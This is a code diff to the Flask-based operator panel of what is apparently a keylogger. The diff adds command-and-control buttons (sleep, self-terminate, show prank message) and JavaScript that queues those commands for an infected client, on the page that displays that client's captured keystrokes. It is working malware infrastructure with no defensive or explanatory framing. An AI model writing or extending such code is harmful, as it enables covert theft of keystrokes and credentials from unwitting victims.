@@ -89,10 +89,48 @@ def view_logs(cid):
         return f"<h2>No logs for {cid}</h2>", 404
     html = """
     <h1>Keylogs for {{cid}}</h1>
+    
+    <div style="margin-bottom: 20px;">
+      <button onclick="queueCommand('{{cid}}', 'slp 10')">Sleep 10s</button>
+      <button onclick="queueCommand('{{cid}}', 'shd')">Self Terminate</button>
+      <button onclick="queueCommand('{{cid}}', 'pwn')">Show Prank Message</button>
+    </div>
+    
+    <div id="command-status" style="color: green; margin-bottom: 15px;"></div>
+    
     {% for ts,txt in logs %}
       <h3>{{ts}}</h3>
       <pre style='white-space:pre-wrap;border:1px solid #ccc;padding:4px;'>{{txt}}</pre>
     {% endfor %}
+    
+    <script>
+      async function queueCommand(id, cmd) {
+        const formData = new FormData();
+        formData.append('id', id);
+        formData.append('cmd', cmd);
+        
+        try {
+          const response = await fetch('/commands', {
+            method: 'POST',
+            body: formData
+          });
+          
+          const result = await response.json();
+          if(result.ok) {
+            document.getElementById('command-status').innerText = `Command '${cmd}' queued successfully!`;
+            setTimeout(() => {
+              document.getElementById('command-status').innerText = '';
+            }, 3000);
+          } else {
+            document.getElementById('command-status').innerText = `Error: ${result.error}`;
+            document.getElementById('command-status').style.color = 'red';
+          }
+        } catch (error) {
+          document.getElementById('command-status').innerText = `Error: ${error.message}`;
+          document.getElementById('command-status').style.color = 'red';
+        }
+      }
+    </script>
     """
     return render_template_string(html, cid=cid, logs=logs)
 
